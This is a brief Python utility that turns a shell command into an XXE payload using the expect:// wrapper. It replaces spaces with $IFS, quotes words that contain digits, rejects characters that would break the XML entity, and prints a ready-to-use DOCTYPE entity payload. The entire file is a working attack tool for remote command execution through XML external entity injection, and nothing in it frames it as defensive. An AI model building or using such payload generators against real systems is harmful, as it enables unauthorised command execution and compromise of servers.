#!/usr/bin/env python3

import argparse


BAD_CHARS=['"', '{', '}', '|', '\\', '<', '>']

def validate_input(string): 
        for char in BAD_CHARS:
                if char in string:
                        print(f'{char} cannot be in XXE payload...')
                        return False
        return True

def transform(string):
        arr = string.split()
        for i, element in enumerate(arr):
                if any(char.isdigit() for char in element):
                        arr[i] = f"'{element}'"
        return "$IFS".join(arr)


if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument("string")

        args = parser.parse_args()

        if not validate_input(args.string):
                exit(1)

        transformed_cmd = transform(args.string)

        expect = f"\"expect://{transformed_cmd}\""
        print(expect)
        print()
        print("Example payload:")
        example_payload=f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM {expect} >]>"
        print(example_payload)

